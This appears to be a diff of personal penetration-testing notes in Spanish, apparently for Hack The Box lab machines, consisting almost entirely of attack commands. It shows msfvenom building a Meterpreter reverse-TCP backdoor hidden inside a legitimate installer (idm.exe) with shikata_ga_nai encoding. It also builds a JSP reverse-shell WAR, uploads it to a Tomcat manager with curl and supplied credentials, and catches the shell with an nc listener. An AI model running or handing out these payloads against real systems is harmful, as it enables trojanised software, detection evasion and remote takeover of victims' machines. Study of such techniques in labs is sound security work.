@@ -11,4 +11,12 @@
                 -f tipoArchivoHere            define el tipo de archivo
                 -o nameFileHere               define el nombre del archivo
 
-msfvenom -a x86 --platform windows -x $HOME/Downloads/idm.exe -k -p windows/meterpreter/reverse_tcp lhost=192.168.0.16 lport=888 -e x86/shikata_ga_nai -i 3 -b "\x00" -f exe -o mango.exe
+	msfvenom -a x86 --platform windows -x $HOME/Downloads/idm.exe -k -p windows/meterpreter/reverse_tcp lhost=192.168.0.16 lport=888 -e x86/shikata_ga_nai -i 3 -b "\x00" -f exe -o mango.exe
+
+*** tomcat
+	::: msfvenom -p java/jsp_shell_reverse_tcp LHOST=$(mvnb --vpn) LPORT=443 -f war -o reverse.war
+
+	::: curl -s -u 'tomcat_User:password_User_tomcat' "http://ip_Targed.htb:8080/manager/text/deplay?path=/pwned" --upload-file reverse.war
+
+						 :: nc -nlvp 443
+						 firefox::: http://ip_Targed:8080/pwned
